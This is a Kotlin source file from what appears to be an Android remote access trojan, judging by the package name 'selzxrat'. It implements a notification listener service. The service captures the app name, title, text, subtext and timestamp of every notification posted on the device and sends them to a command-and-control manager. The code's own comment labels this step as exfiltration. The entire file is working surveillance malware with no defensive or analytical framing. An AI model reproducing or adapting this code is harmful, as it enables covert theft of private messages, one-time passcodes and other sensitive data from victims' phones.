package com.selzxrat.v5.services

import android.app.Notification
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.selzxrat.v5.C2Manager

class NotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifListener"
        var isConnected = false
            private set
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        isConnected = true
        Log.d(TAG, "Notification Listener Connected")
        C2Manager.sendCommand("self", "notif_listener_status", "enabled")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        isConnected = false
        Log.d(TAG, "Notification Listener Disconnected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val notification = sbn.notification

        // Extract notification data
        val extras = notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
        val summary = extras.getString(Notification.EXTRA_SUMMARY_TEXT) ?: ""

        val notifData = mapOf(
            "package" to packageName,
            "title" to title,
            "text" to text,
            "subText" to subText,
            "summary" to summary,
            "timestamp" to sbn.postTime.toString(),
            "isOngoing" to sbn.isOngoing.toString()
        )

        Log.d(TAG, "Notification from $packageName: $title - $text")

        // Exfiltrate notification data
        C2Manager.sendCommand("self", "notification_data", notifData.toString())
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Notification removed
    }

    fun getActiveNotificationsList(): List<StatusBarNotification> {
        return try {
            activeNotifications.toList()
        } catch (e: Exception) {
            emptyList()
        }
    }
}